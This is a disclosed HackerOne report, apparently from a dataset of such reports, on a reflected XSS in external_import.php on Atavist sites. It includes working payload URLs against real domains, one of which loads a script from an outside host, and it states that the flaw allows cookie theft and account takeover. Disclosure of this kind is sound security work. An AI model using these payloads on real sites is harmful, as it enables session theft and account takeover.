---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '976657'
original_report_id: '976657'
title: Reflected XSS on a Atavist theme at external_import.php
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: automattic
created_at: '2020-09-08T10:12:34.933Z'
disclosed_at: '2020-11-18T14:21:52.969Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on a Atavist theme at external_import.php

## Metadata

- HackerOne Report ID: 976657
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: automattic
- Disclosed At: 2020-11-18T14:21:52.969Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hi team,
I found this php file https://magazine.atavist.com/static/external_import.php , and there is a parameter called `scripts` on this php file. 
Basically, the endpoint prints value of `scripts` parameter to `<script src='$Value'>`.
So we can import any script file like that : https://magazine.atavist.com/static/external_import.php?scripts=//15.rs
Or we can write HTML tags too, there is no encoding : https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

This endpoint is also available on other websites. Like :
https://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
http://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

Also there is no secure flag on the session cookie (`periodicSessionatavist`). So this XSS leads to account takeover.

## Impact

Reflected XSS - account takeover via cookie stealing

Thanks,
Bugra

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
